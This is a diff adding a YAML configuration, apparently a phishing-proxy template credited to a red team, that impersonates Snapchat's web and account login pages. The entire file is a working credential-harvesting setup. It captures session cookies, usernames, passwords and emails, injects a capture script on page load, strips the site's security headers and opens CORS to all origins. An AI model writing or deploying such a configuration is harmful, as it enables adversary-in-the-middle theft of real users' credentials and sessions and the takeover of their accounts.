@@ -1,0 +1,39 @@
+name: "Snapchat"
+author: "Vanta v5 Red Team"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "web"
+    target: "web.snapchat.com"
+  - subdomain: "accounts"
+    target: "accounts.snapchat.com"
+auth_urls: 
+  - "/login"
+  - "/accounts"
+landing_path: ["/accounts/login"]
+auth_tokens:
+  - {type: "cookie", name: "sc-a"}
+  - {type: "cookie", name: "xsrf"}
+  - {type: "cookie", name: "session"}
+credentials:
+  - {type: "post_param", name: "username", regex: null}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "email", regex: "^[^@]+@[^@]+\\.[^@]+$"}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Feature-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/accounts/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "sc-analytics|bitmoji|/ads/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*='login']", action_to: "/accounts/login"}
+bridges:
+  - {prefix: "/accounts/", target_host: "accounts.snapchat.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS"]
+  headers: ["*"]
